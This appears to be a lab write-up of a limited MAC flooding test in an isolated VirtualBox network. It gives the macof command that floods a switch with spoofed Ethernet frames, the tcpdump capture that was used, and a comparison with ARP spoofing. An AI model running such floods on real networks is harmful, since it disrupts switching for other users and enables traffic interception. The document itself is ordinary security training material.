# MAC Flooding

## Purpose

Test MAC flooding inside the isolated VirtualBox lab network using `macof` from the dsniff toolset.

MAC flooding is a Layer 2 attack that attempts to overwhelm a switch's MAC address table by sending many frames with spoofed source MAC addresses.

## Confirm macof Is Installed

From Kali:

```bash
which macof
```

Output:

```text
/usr/bin/macof
```

## Capture Ethernet Traffic

The first attempted tcpdump filter was invalid:

```bash
sudo tcpdump -i eth0 ether
```

Error:

```text
tcpdump: link layer applied in wrong context
```

The corrected tcpdump command was:

```bash
sudo tcpdump -i eth0 -e -n
```

Meaning:

```text
-i eth0  = listen on eth0
-e       = show Ethernet/MAC headers
-n       = do not resolve names
```

## Run Limited MAC Flooding Test

From a second Kali terminal:

```bash
sudo macof -i eth0 -n 50
```

## Observed Result

`macof` generated many packets with random-looking source MAC addresses and ports.

`tcpdump` captured the generated traffic and reported:

```text
492 packets captured
492 packets received by filter
0 packets dropped by kernel
```

## Key Lesson

MAC flooding differs from ARP spoofing:

| ARP Spoofing | MAC Flooding |
|---|---|
| Poisons IP-to-MAC mappings | Floods switch MAC address table |
| More targeted | Noisier and more disruptive |
| Uses forged ARP replies | Uses many spoofed Ethernet frames |
| Goal is to become on-path | Goal is to overwhelm or confuse switching behavior |

## Result

The MAC flooding test successfully generated spoofed Layer 2 traffic inside the isolated VirtualBox lab network.
